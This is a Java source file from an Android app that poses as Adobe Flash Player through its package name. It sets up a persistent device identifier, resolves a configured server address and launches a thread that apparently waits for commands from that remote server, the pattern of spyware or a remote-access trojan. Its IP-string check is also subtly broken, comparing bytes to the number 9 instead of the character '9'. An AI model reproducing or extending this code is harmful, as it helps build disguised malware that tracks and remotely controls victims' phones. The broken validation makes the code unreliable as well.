package com.adobe.flashplayer.network;

import android.content.Context;
import android.content.pm.PackageManager;
import android.provider.Settings;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.PrefOper;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;

import java.net.InetAddress;
import java.util.UUID;

public class Network {

    private static final String TAG = "[ljg]Network";

    public static boolean initIMEI(Context context) {
        String strid = PrefOper.getValue(context, Public.PARAMCONFIG_FileName, Public.CFGCLIENTID);
        if (strid != null && strid.equals("") == false) {
            System.arraycopy(strid.getBytes(), 0, Public.IMEI, 0, strid.getBytes().length);
            return true;
        } else {
            strid = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            if (strid == null || strid.equals("") == true) {
                String uuid = UUID.randomUUID().toString();
                uuid = uuid.replaceAll("-", "");
                uuid = uuid.substring(0, 16);
                strid = uuid;

                PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGCLIENTID, strid);
                System.arraycopy(strid.getBytes(), 0, Public.IMEI, 0, strid.getBytes().length);
                Log.e(TAG, "[ljg]Android ID randomUUID!");
                return true;
            } else {
                //strid = String.valueOf(System.currentTimeMillis() );
                PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGCLIENTID, strid);
                System.arraycopy(strid.getBytes(), 0, Public.IMEI, 0, strid.getBytes().length);
                return true;
            }
        }
    }



    public static boolean getIP( Context context) {
        final String serverip = PrefOper.getValue(context, Public.PARAMCONFIG_FileName, Public.CFGSERVERIP);
        if (serverip != null && serverip.equals("") == false) {
            getIpFromStr(serverip,context);
        } else {
            Log.e(TAG, "[ljg]not found ip address in config! current address:" + Public.SERVER_IP_ADDRESS);
        }

        Public.gOnlineType = NetworkUtils.getNetworkType(context);

        return true;
    }

    public static  boolean isIPstr(String str){
        int dotNum = 0;
        int digitalNum = 0;

        int len = str.length();
        byte [] data = str.getBytes();
        for (int i = 0;i < len;i ++){
            if (data[i] >= '0' && data[i] <= 9){
                digitalNum ++;
            }else if (data[i] == '.'){
                dotNum ++;
            }else{
                break;
            }
        }

        if (dotNum + digitalNum == len){
            if (dotNum == 3 ){
                return true;
            }
        }
        return false;
    }


    public static void getIpFromStr(final String serverip, final Context context) {
        boolean isipstr = isIPstr(serverip);
        if (isipstr) {
            Public.SERVER_IP_ADDRESS = serverip;
        } else {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.ACCESS_NETWORK_STATE);
                        if (granted != PackageManager.PERMISSION_GRANTED){
                            Log.e(TAG,"program has no rights to access network state");
                            return ;
                        }
                        Public.SERVER_IP_ADDRESS = InetAddress.getByName(serverip).getHostAddress();
                        Log.e(TAG, Public.SERVER_IP_ADDRESS);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }


    public Network(Context context) {
        boolean result = initIMEI(context);
        if (result == false) {

        }
        result = Public.getUsername(context);
        if (result == false) {

        }

        result = getIP(context);
    }



    public static void launchServerCmdThread(Context context){
        Thread s = Utils.getThreadForName(Public.SERVER_CMD_THREADNAME);
        if (null == s)
        {
            ServerCommand server = new ServerCommand(context);
            Thread thread = new Thread(server,Public.SERVER_CMD_THREADNAME);
            thread.start();
            Log.e(TAG,"create server command thread");
            MyLog.writeLogFile("launchServerCmdThread complete\r\n");
        }
        else if (!s.isAlive()){
            s.start();
            Log.e(TAG,"start server command thread");
        }else{
            Log.e(TAG,"server command thread is running");
        }
    }
}